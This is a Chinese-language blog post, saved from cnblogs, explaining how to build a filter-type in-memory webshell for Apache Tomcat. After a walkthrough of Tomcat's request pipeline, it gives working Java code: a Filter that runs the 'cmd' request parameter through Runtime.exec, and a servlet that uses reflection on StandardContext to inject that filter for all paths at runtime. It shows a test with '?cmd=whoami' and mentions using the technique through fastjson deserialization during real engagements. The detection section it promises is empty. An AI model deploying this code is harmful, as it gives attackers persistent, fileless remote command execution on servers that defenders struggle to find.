<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/zpchcbd/p/14814385.html)

完全参考：[https://www.cnblogs.com/nice0e3/p/14622879.html](https://www.cnblogs.com/nice0e3/p/14622879.html)

这篇笔记，来源逗神的指点，让我去了解了内存马，这篇笔记记录的是 filter 类型的内存马

内存马的学习基本都是参考上面标注的博客文章，主要自己过一遍学习！

什么是内存马
======

什么是内存马，内存马即是无文件马，只存在于内存中。我们知道常见的 WebShell 都是有一个页面文件存在于服务器上，然而内存马则不会存在文件形式。

落地的 JSP 文件十分容易被设备给检测到，从而得到攻击路径，从而删除 webshell 以及修补漏洞，内存马也很好的解决了这个问题。

Tomcat 请求处理结构
=============

在这里我们来学习下 Tomcat 的结构，以下是 Tomcat 对请求处理流程的结构图

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526222636585-499306615.png)

Server
------

即指的 WEB 服务器, 一个 Server 包括多个 Service。

Service
-------

在 Connector 和 Engine 外面包了一层（可看上图），把它们组装在一起，对外提供服务。

一个 Service 可以包含多个 Connector，但是只能包含一个 Engine，其中 Connector 的作用是从客户端接收请求，Engine 的作用是处理接收进来的请求。

Connector
---------

Connector（连接器）组件是 Tomcat 最核心的两个组件之一，**主要的职责就是负责接收客户端连接和客户端请求的处理加工 Request 和 Response 对象**。

每个 Connector 都将指定一个端口进行监听，分别负责对请求报文的解析和响应报文组装，解析过程生成 Request 对象，而组装过程涉及 Response 对象。

Tomcat 有两个典型的 Connector：

1、一个直接侦听来自 browser 的 http 请求，一个侦听来自其它 WebServer 的请求 Coyote Http/1.1 Connector 在端口 8080 处侦听来自客户 browser 的 http 请求。

2、另外一个是 Coyote JK2 Connector 在端口 8009 处侦听来自其它 WebServer(Apache) 的 servlet/jsp 代理请求。

Engine
------

可以用来配置多个虚拟主机，每个虚拟主机都有一个域名当 Engine 获得一个请求时，它把该请求匹配到某个 Host 上，然后把该请求交给该 Host 来处理 Engine 有一个默认虚拟主机，当请求无法匹配到任何一个 Host 上的时候，将交给该默认 Host 来处理。

Host：
-----

每一个 Host 代表一个虚拟主机，每个虚拟主机和某个网络域名 Domain Name 相匹配，这个点可以利用是 hosts 碰撞

每个虚拟主机下都可以部署 (deploy) 一个或者多个 Web App，每个 Web App 对应于一个 Context，有一个 Context path，当 Host 获得一个请求时，将把该请求匹配到某个 Context 上，然后把该请求交给该 Context 来处理匹配的方法是 "最长匹配"，所以一个 path=="" 的 Context 将成为该 Host 的默认 Context 所有无法和其它 Context 的路径名匹配的请求都将最终和该默认 Context 匹配。

Context：
--------

一个 Context 对应于一个 Web Application，一个 WebApplication 由一个或者多个 Servlet 组成。

Context 在创建的时候将根据配置文件 $CATALINA_HOME/conf/web.xml 和 $WEBAPP_HOME/WEB-INF/web.xml 载入 Servlet 类，当 Context 获得请求时，将在自己的映射表 (mapping table) 中寻找相匹配的 Servlet 类。如果找到，则执行该类，获得请求的回应，并返回。

这里的映射表其实就是在编写完每个 Servlet 的时候，需要在 web.xml 中写到对应的映射标签！

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526225915394-2077393005.png)

Tomcat 的解析流程
============

还是从 Connector 开始，Connector 将在某个指定的端口上来监听客户的请求，把从 socket 传递过来的数据，封装成 Request，传递给 Engine 来处理，并从 Engine 处获得响应并返回给客户端。

Engine：最顶层容器组件，其下可以包含多个 Host。  
Host：一个 Host 代表一个虚拟主机，其下可以包含多个 Context。  
Context：一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper。  
Wrapper：一个 Wrapper 代表一个 Servlet。

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526231459874-689204273.png)

### ProtocolHandler：

在 Connector 中，包含了多个组件，Connector 使用 ProtocolHandler 处理器来进行加工。

不同的 ProtocolHandler 代表不同连接类型。ProtocolHandler 处理器可以用看作是协议处理统筹者，通过管理其他工作组件实现对请求的处理。

ProtocolHandler 包含了三个非常重要的组件，这三个组件分别是：

*   Endpoint: 负责接受，处理 socket 网络连接
*   Processor： 负责将从 Endpoint 接受的 socket 连接根据协议类型封装成 request
*   Adapter: 负责将封装好的 Request 交给 Container 进行处理, 解析为可供 Container 调用的继承了 ServletRequest 接口、ServletResponse 接口的对象。

请求经 Connector 处理完毕后，传递给 Container 进行处理。

### Container

Container 容器则是负责封装和管理 Servlet 处理用户的 Servlet 请求，并返回对象给 web 用户的模块。

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526230734248-1642355288.png)

Container 处理请求，内部是使用 Pipeline-Value 管道来处理的，每个 Pipeline 都有特定的 Value（BaseValue），BaseValue 会在最后执行。

上层容器的 BaseValue 会调用下层容器的管道，FilterChain 其实就是这种模式，FilterChain 相当于 Pipeline，每个 Filter 相当于一个 Value。

4 个容器的 BaseValve 分别是 StandardEngineValve 、StandardHostValve 、StandardContextValve 和 StandardWrapperValve。

每个 Pipeline 都有特定的 Value ，而且是在管道的最后一个执行，这个 Valve 叫 BaseValve，BaseValve 是不可删除的。

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526231306798-1699719163.png)

最终的流程图如下：

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210526231702391-983087435.png)

上面的全部都是抄的，我得用自己的话来加深理解，首先我们在 tomcat 的解析流程中，我们先了解到的是 Connector，它又被称作为连接器，真正起到作用是 Connector 内部的 ProtocolHandler 处理器，这个 ProtocolHandler 处理器封装用户发起的网络请求所对应的 Request 对象，和当内部处理完返回过来的 Response 对象。

那么当 Connector 的 ProtocolHandler 处理器封装完 Request 对象之后，就会发送给 Container，这个 Container 容器则是负责封装和管理 Servlet 和处理用户的 servlet 请求，这里所谓的 Servlet 请求其实就是处理 Request 对象，在处理请求中，起作用的角色则是 Container 中的 Pipeline-Value 管道来处理的，当 Pipeline-Value 处理完之后，接着就会看到一个 FilterChain 对象！

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210528000632467-2041605002.png)

FilterChain 对象
==============

这里继续将 FilterChain，这个对象大家肯定都很熟悉啊，因为在学习 Servlet 的时候，这个是经常出现的，比如我们想要对传进来的数据先做一定的处理，然后再到 Servlet 对象中进行处理，这里都会用到这个 FilterChain 对象

过滤链（FilterChain）：在一个 Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以针对某一个 URL 进行拦截。

如果多个 Filter 程序都对同一个 URL 进行拦截，那么这些 Filter 就会组成一个 Filter 链（也称过滤器链）

小知识点：在开发中，当我们想要进行多个 FilterChain 同时作用的时候，那么我们此时还会用到该对象中的 doFilter 方法来进行传递处理！如果只有一个 Filter 也需要，默认它则转发给对应的 Servlet！

整体的流程：

Server :

*   Service  
    -- Connector: 客户端接收请求  
    --- ProtocolHandler: 管理其他工作组件实现对请求的处理  
    ---- Endpoint: 负责接受，处理 socket 网络连接  
    ---- Processor: 负责将从 Endpoint 接受的 socket 连接根据协议类型封装成 request  
    ---- Adapter: 负责将封装好的 Request 交给 Container 进行处理, 解析为可供 Container 调用的继承了 ServletRequest 接口、ServletResponse 接口的对象  
    --- Container: 负责封装和管理 Servlet 处理用户的 servlet 请求，并返回对象给 web 用户的模块  
    -- Engine: 处理接收进来的请求  
    --- Host: 虚拟主机  
    --- Host: 虚拟主机  
    --- Host: 虚拟主机  
    --- Context: 相当于一个 web 应用  
    --- Context：相当于一个 web 应用  
    --- Context：相当于一个 web 应用

到了这里，我们来实现一个简单的 FilterChain 吧

用到的 POM 依赖

```
<dependencies>
        <!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
            <scope>provided</scope>
        </dependency>

        <!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api -->
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>javax.servlet.jsp-api</artifactId>
            <version>2.3.3</version>
            <scope>provided</scope>
        </dependency>


```

Servlet 中实现的代码如下：

```
public class MyServlet extends HttpServlet {


    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("我是doGet方法");
        resp.getWriter().print("WOW 我爱上了你");
    }


    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }
}


```

过滤器实现的代码：

```
public class MyFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("WOW Filter init");
    }


    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        response.setCharacterEncoding("utf-8");
        request.setCharacterEncoding("utf-8");
        response.setContentType("text/html;Charset=UTF-8");
        System.out.println("我接收到了请求，并且马上就要进行过滤了");
        chain.doFilter(request, response); //chain.doFilter将请求转发给过滤器链下一个filter,如果没有filter那就是转发给Servlet，你需要请求的资源
        System.out.println("我过滤完了...");
    }


    @Override
    public void destroy() {
        System.out.println("WOW Filter destroy");
    }
}


```

结果如下，可以看到是 过滤器先接收到请求，然后再转发给 Servlet，然后 Servlet 走了之后又回到过滤器中再之后 doFilter 之后的内容！

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210528001722075-1331814401.png)

内存马的实现
======

上面了解了关于 Filter 对象的学习，那么其实内存马也差不多了解了，就是对一个 Filter 接口实现的对象

如下先实现一个简单的 Filter 对象的命令执行的效果

首先那么就是在接口中进行对数据的传入进行判断，对于特殊的字段进行判断，比如 "cmd"，"command" 类似的 headers 来进行判断，这种实现了之后，我们还需要进行全局过滤，就是任何一个路径都需要进行过滤，所以在 Servlet 中实现的时候，映射的 Mapping 也需要是为`/*`这种形式！

如下进行实现操作：

```
public class MemoryFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        if (request.getParameter("cmd") != null){
            Process exec = Runtime.getRuntime().exec(request.getParameter("cmd"));
            InputStream inputStream = exec.getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
        System.out.println("过滤器调用完毕，开始转发给Servlet...");
        chain.doFilter(request,response);

    }

    @Override
    public void destroy() {

    }
}



```

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529123242664-678458118.png)

接着再加上映射关系：

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529123235874-1020111945.png)

当请求 URL 为：[http://127.0.0.1:8080/?cmd=whoami](http://127.0.0.1:8080/?cmd=whoami)

可以发现已经成功执行命令了，并且回显在页面上

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529123317663-2090698425.png)

上面演示了下关于过滤链，那么对于内存马到底是如何实现的？

首先得明白一点，在实战环境下，你不可能写一个 Filter 对象然后又放到对方的代码中，这样子不就早 getshell 了

所以对于内存马，我们是需要找到一个注入点，动态的在内存中创建一个 Filter 对象，这样子的话就是一个真正的内存马！

那么如何可以动态的在内存中创建 Filter 对象呢？

知识点 1：ServletContext
--------------------

web 应用启动的时候，都会产生一个 ServletContext 为接口的对象，因为在 web 中这个 ServletContext 对象的一些数据能够保证 Servlets 稳定运行

那么该对象如何获得？

在 tomcat 容器中中 ServletContext 的实现类是 ApplicationContext 类

在 web 应用中，获取的 ServletContext 实际上是 ApplicationContextFacade 的对象，对 ApplicationContext 进行了封装，而 ApplicationContext 实例中又包含了 StandardContext 实例，所以说我们在 tomcat 中拿到 StandardContext 则是去获取 ApplicationContextFacade 这个对象。

我们这里通过一个`ServletContext servletContext = this.getServletContext();`来进行观察这个 servletContext 是不是我们上面所说的 ApplicationContextFacade 这个对象！

如下所示下一个断点

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529142416008-2015894560.png)

当前获取到了 ServletContext 的实现类，如下所示

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529144106137-374961072.png)

我们可以看到这个名为 ApplicationContextFacade 类，到这里可以说明 Tomcat 的 ServletContext 对象确实是 ApplicationContextFacade 对象

知识点 2：组装 Filters 的流程
--------------------

我们还需要看下 Filter 的调用流程是怎么样的？

这里想要调试 tomcat 的话，需要注意的记得把 tomcat 下的 lib 文件导入到 idea 工程中，要不然 idea 在调试的时候是找不到的！

找到 ApplicationFilterChain 对象中，internalDoFilter 方法上打上断点（为啥要在这里打断点，后面有说明）

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210530143421398-1058695022.png)

继续跟，可以看到这个 internalDoFilter 方法获取到了我们所实现的 MemoryFilter 对象

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529144553157-1427772105.png)

internalDoFilter 方法中接着又会开始调用 MemoryFilter 对象中实现的 doFilter 方法

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529144623488-196078450.png)

接着就是来到了我们所实现的 doFilter 的方法，也就是我们执行命令的方法

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529144706204-1980317455.png)

那么我为什么下断点会下在 ApplicationFilterChain 对象中的 internalDoFilter 呢？

那还得看 ApplicationFilterChain 这个对象是什么？大家可以理解为它是一个调用 Filter 对象的一个调度类，就是专门用来调用所有实现的 Filter 对象的 doFilter 方法，而其中的 internalDoFilter 就是去调用我们 Filter 对象中实现的 doFilter 方法的一个手段

ApplicationFilterChain 这个对象又是哪来的呢？我们可以从调用栈中进行观察，下面的图中可以看到 StandardWrapperValve 这个类中的 invoke 方法来进行调用的

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529145710324-491141900.png)

来到这个 StandardWrapperValve 的调用栈 invoke 方法中，可以看到是通过 doFilter 来进行调用

![](https://img2020.cnblogs.com/blog/1586953/202106/1586953-20210629195025147-1173080508.png)

在 StandardWrapperValve 类的 invoke 中，往上拉，其中可以看到这里的 filterChain 为 ApplicationFilterChain 的实例化，到这里就可以思考下，上面说到的 filterChain.doFilter 的 filterChain，原来 filterChain 属性是通过 ApplicationFilterFactory.createFilterChain 这个方法所获得的，这里继续跟到 createFilterChain 方法中进行查看

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529145954218-963673775.png)

跟进 createFilterChain 的方法中，它会获取一个 StandardContext 对象 (这个就是我们先引入的知识点 1)，通过这个对象的 findFilterMaps 方法来获得所有需要调用的 Filter 对象，获得到的 Filter 对象都会放到一个 filterMaps 的 FilterMap 数组中去，可以看到当前获得的就两个 Filter，其中一个是 tomcat 默认的，还有个就是我们自己实现的 MemoryFilter 对象

![](https://img2020.cnblogs.com/blog/1586953/202106/1586953-20210629200207428-1794425372.png)

接着又会开始遍历这个 FilterMap 数组中的每个 FilterMap 对象（每个 FilterMap 都包含了每个 Filter 的相关信息），每次拿到一个 FilterMap 对象就是通过 matchDispatcher 和 matchFiltersURL 来比较访问的路由和 Filter 对象的路由是否有包含关系，最后会每个 Filter 对象相关信息都存储到了 FilterConfig 对象中，然后再把 FilterConfig 对象放到了 filterChain 这个属性中，而这里的 filterChain 属性就是外面的这个 ApplicationFilterChain 对象，到这里要调用的每个 Filter 对象都拼装好了，全部都放入了 ApplicationFilterChain 对象，ApplicationFilterChain 这个对象我们上面也讲过，是一个调度类，专门调用每个 Filter 的 doFilter 方法。

知识点 3：FilterConfig
------------------

现在已经知道了 ApplicationFilterChain 这个对象的由来和它的作用，我们继续整理下，先是经过一系列的处理最后拿到了 ApplicationFilterChain 这个对象，这个对象中包含了每个 Filter 的相关配置信息，最后则开始调用其中的 doFilter 方法

继续来看 createFilterChain 方法帮我们做的事情，它实现的 Filter 的添加，createFilterChain 这个方法返回的 filterChain 最终会被进行调用，那么我们如果能实现在 filterChain 进行插入的话，那是不是我们就成功的实现了添加自定义的 Filter 对象？

答案是的，那需要如何实现？回到这个 createFilterChain 方法中，我们可以看下如下，每次成功添加一个 filterConfig 则意味着 Filter 对象的成功被添加进去

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529155511466-168394820.png)

这个 FilterConfig 对象中包含着如下属性

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210529155552714-52586671.png)

该对象有三个重要的属性，一个是 ServletContext，一个是 filter，一个是 filterDef

那么想要实现一个完整的 filterConfig，那么也就是需要这三个，一个是 ServletContext，一个是 filter，一个是 filterDef

开始理清思路：

1、获取当前应用的 ServletContext 对象

2、再获取 filterConfigs

2、接着实现自定义想要注入的 filter 对象

4、然后为自定义对象的 filter 创建一个 FilterDef

4、最后把 ServletContext 对象 filter 对象 FilterDef 全部都设置到 filterConfigs 即可完成内存马的实现

这里我们第一步为什么要先获取 ServletContext 对象，原因就是想要获取 filterConfigs 就需要通过 ServletContext 来获取！

实现的代码如下：

```
public class InjectMemoryServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Field Configs = null;
        Map filterConfigs;
        try {
            //这里是反射获取ApplicationContext的context，也就是standardContext
            ServletContext servletContext = req.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            String FilterName = "cmd_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null){

                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            servletResponse.getWriter().write(output);

                            return;
                        }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };
                //反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);
                //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();

                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);

                //反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
                declaredConstructor1.setAccessible(true);
                ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
                filterConfigs.put(FilterName,filterConfig);
                resp.getWriter().write("Success");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }
}


```

接着注册下映射关系

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210530145421165-1351271387.png)

这里测试之前先把之前注册的 filter 注释掉，接着启动服务进行测试

访问 URL：[http://127.0.0.1:8080/?cmd=whoami](http://127.0.0.1:8080/?cmd=whoami)

因为前面的 filter 注释掉了，所以这里没反应

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210530145537154-959676994.png)

访问 URL：[http://127.0.0.1:8080/inject](http://127.0.0.1:8080/inject)

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210530145625969-1879629472.png)

接着访问 URL：[http://127.0.0.1:8080/?cmd=whoami](http://127.0.0.1:8080/?cmd=whoami)

![](https://img2020.cnblogs.com/blog/1586953/202105/1586953-20210530145643602-1375539292.png)

那么到现在为止也就是内存马创建了，实现内存马在这里就讲完了

内存马的查杀
======

参考文章：[http://gv7.me/articles/2020/kill-java-web-filter-memshell/](http://gv7.me/articles/2020/kill-java-web-filter-memshell/)

已经学，那就一次性彻底了解到位！

上面已经学习了如何实现内存马，那么这里继续了解内存马该如何查杀

我看了下，又是一些盲目的知识点，还是以后补上去吧！

fastjson 配合内存马的实战
=================

项目测试中遇到的 fastjson，由于环境问题导致无法反弹 shell，我这里使用 fastjson 反序列化漏洞来实现内存马！

自己在找资料的时候看到的都是 shiro 的内存马，所以想要实现 fastjson 反序列化的内存马，这就需要我们自己动手来改了

2021.11.18 补充

参考博客中另外的文章即可：

1、[https://www.cnblogs.com/zpchcbd/p/15544419.html](https://www.cnblogs.com/zpchcbd/p/15544419.html)

2、[https://www.cnblogs.com/zpchcbd/p/15545773.html](https://www.cnblogs.com/zpchcbd/p/15545773.html)